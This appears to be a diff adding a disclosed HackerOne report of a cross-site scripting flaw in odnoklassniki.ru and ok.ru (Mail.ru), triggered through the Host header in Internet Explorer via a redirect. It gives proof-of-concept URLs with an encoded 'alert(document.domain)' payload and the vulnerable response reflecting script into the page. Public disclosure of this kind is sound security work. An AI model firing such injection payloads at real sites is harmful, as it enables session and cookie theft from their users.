@@ -1,0 +1,23 @@
+ReportLink:https://hackerone.com/reports/39316
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:26.09.2016 14:12:54
+
+Summary:
+
+XSS через Host заголовок в браузере Internet Explorer (с использованием ошибки перенаправления).
+
+PoC:
+http://blackfan.ru/x?r=http://odnoklassniki.ru%252f%253f%2523"*alert(document.domain)*"
+http://blackfan.ru/x?r=http://ok.ru%252f%253f%2523"*alert(document.domain)*"
+
+HTTP Response:
+```<script type="text/javascript">
+ ...
+ host:"http://odnoklassniki.ru/?#"*alert(document.cookie)*""
+ ...
+ </script>```
